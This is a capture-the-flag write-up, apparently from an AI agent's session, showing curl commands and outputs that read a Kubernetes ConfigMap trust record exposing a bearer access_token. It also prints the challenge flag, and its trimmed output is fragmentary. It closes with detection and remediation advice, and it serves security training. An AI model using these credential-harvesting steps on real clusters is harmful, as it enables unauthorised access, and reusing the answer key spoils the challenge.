# K14.1 — The trust document

> **Category:** 2. KeplerOps · **Points:** 50 · **Difficulty:** easy
> **Solved by:** opencode/OC session (manual, in-session)

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary service: `cloud-api.keplerops.test`. The trust record is also mirrored as a ConfigMap in
namespace `fieldlink` on the k3s API at `https://cloud-api.keplerops.test:6443`.

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Trust material stored in a readable ConfigMap: the workload's trust document carries a bootstrap `access_token` and is readable by the same service account it authorises |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET /api/trust-records/TRUST-FLX-04` with the workload JWT; `GET /api/v1/namespaces/fieldlink/configmaps/trust-flx-04` |
| **Prerequisite** | A workload JWT from `POST /api/workspaces/current/token-exchange` (the K13.4 exchange) |
| **Flag** | `FLAG{418e19c3ed0c13ef}` |

**What you are about to read:** the actual response for the trust record and the same object from
the Kubernetes side. This card is a straight disclosure: the trust record is configuration, and
the deployment put a bearer credential inside it.

## Objective

> Recover the workload's current trust document and the service relationship it describes.

The document names the workload, the audience it may exchange for, the export role it can reach,
and a bootstrap `access_token`. The relationship is the answer; the token is the flag.

## Background you need

A workload trust record is the anchor for federation:

```
issuer  ──signs──▶ workload JWT
   ▲                    │
   │                    ▼
trust record ◀── decides ── token exchange ──▶ scoped role
```

The trust record is usually metadata: issuer, subject, allowed audience, target role. Here it
also contains a bearer (`access_token`) that can bootstrap the exchange. That turns a
configuration object into a credential.

The two views in this estate behave differently:

| View | Credential | Result |
|---|---|---|
| Cloud API `/api/trust-records/TRUST-FLX-04` | workload JWT | 200 with the record |
| Cloud API `/api/trust-records/TRUST-FLX-04` | export JWT | 403 `k3s_rbac_denied` |
| k3s ConfigMap `fieldlink/trust-flx-04` | workload JWT | 200 with the same data |

The scope difference is the point: the workload identity can read its own trust anchor, while
the delegated export role cannot.

## Walkthrough

### 1. Get the workload identity

The exchange is the same one used for K13.4. The rowan developer credential is the caller:

```bash
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_…"

WT=$($C -u "$U" -X POST \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/workspaces/current/token-exchange" | jq -r .access_token)
```

### 2. Read the trust record through the cloud API

```bash
$C -H "Authorization: Bearer $WT" "$B/api/trust-records/TRUST-FLX-04"
```

```json
{
  "accepted_audiences": "[\"https://kubernetes.default.svc.cluster.local\",\"k3s\"]",
  "access_token": "FLAG{418e19c3ed0c13ef}",
  "export_role": "fieldkest-export-access",
  "issuer": "https://kubernetes.default.svc.cluster.local",
  "schema": "fieldkest.trust-record/v1",
  "service_ref": "fieldkest-exports",
  "subject": "system:serviceaccount:fieldlink:svc-fieldlink-workload",
  "trust_id": "TRUST-FLX-04"
}
```

Every field is a map for the next cards:

- `subject` — the identity we are holding.
- `accepted_audiences` — the k3s API audiences the JWT can be used against.
- `export_role` — the role K14.2 will ask for by name.
- `service_ref` — the service the relationship is for (`fieldkest-exports`).

### 3. Cross-check the Kubernetes object

The same record is a ConfigMap, which lets us see how it was applied and when the token was
added:

```bash
$C -H "Authorization: Bearer $WT" \
  "$K/api/v1/namespaces/fieldlink/configmaps/trust-flx-04"
```

Trimmed output:

{
  "kind": "ConfigMap",
  "metadata": {
    "name": "trust-flx-04",
    "namespace": "fieldlink",
    "labels": {"fieldkest.io/kind": "trust-record"},
    "managedFields": [

       "time": "2026-11-19T07:07:23Z"},

    "export_role": "fieldkest-export-access",

The `kubectl-patch` entry at 13:42:23Z adds only `access_token` — the token was patched into the
record after creation. That is the exact moment the config object became a credential.

## Why this works

The trust record is the configuration that says *this workload, for these audiences, may become
that role*. It is not supposed to be a secret, but it also should not contain a secret. Two
mistakes compound:

1. **Classification.** The record lives in a ConfigMap. ConfigMaps are not Secrets; they are
   readable by anyone with `get configmaps` in the namespace, and they are often dumped into
   dashboards, logs and backups.
2. **Self-authorisation.** The `access_token` is granted to the same service account the record
   authorises. Reading the record is therefore enough to re-mint the identity and everything the
   record references. Compromise of the workload and compromise of its trust anchor are the same
   event.

The `kubectl-patch` history makes the bug legible: the initial object was pure metadata, and a
later patch added `access_token` into the same data map.

## Detection and fix

- **Signal:** reads of `fieldkest.io/kind=trust-record` ConfigMaps by the service account they
  authorise; any ConfigMap data key ending in `_token`; the `kubectl-patch` addition of a key to
  a trust object.
- **Fix:**
  1. Move the bootstrap bearer to a Secret or eliminate it (projected tokens, short TTL,
     audience-bound).
  2. Remove the workload from the RBAC that reads its own trust record; trust records belong to
     the control plane, not the workload namespace.
  3. Rotate `access_token` immediately; the record was readable.
  4. Alert on the audit event `configmaps get` for trust objects, especially from a workload
     service account.

## Notes and dead ends

- The cloud API view and the Kubernetes view return the same data. The API view is handier for
  the scoreboard because it returns the record fields directly, without metadata noise.
- The export JWT from K14.2 is denied this record (`k3s_rbac_denied`). Use the workload JWT.
- `trust-flx-04` was tried as a K13.4 answer and rejected. K13.4's record is `bld-1842`.
- The relationship fields (`export_role`, `service_ref`, `accepted_audiences`) are the input to
  K14.2, not a dead end: they name the audience that can be exchanged for the export role.
